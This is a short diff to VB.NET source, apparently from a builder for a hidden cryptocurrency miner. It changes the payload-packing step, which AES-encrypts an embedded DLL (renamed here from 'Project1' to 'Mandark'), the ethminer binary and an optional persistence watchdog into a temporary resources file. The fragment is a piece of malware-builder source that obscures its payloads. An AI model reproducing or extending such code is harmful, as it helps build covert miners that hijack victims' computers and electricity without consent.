@@ -35,7 +35,7 @@ Public Class Codedom
             F.txtLog.Text = F.txtLog.Text + ("Creating resources..." + vbNewLine)
 
             Using R As New Resources.ResourceWriter(IO.Path.GetTempPath & "\" + Res + ".Resources")
-                R.AddResource(F.Resources_dll, F.AES_Encryptor(My.Resources.Project1))
+                R.AddResource(F.Resources_dll, F.AES_Encryptor(My.Resources.Mandark))
                 R.AddResource(F.Resources_eth, F.AES_Encryptor(My.Resources.ethminer))
                 If F.chkInstall.Checked And F.toggleWatchdog.Checked Then
                     R.AddResource(F.Resources_watchdog, F.AES_Encryptor(F.watchdogdata))
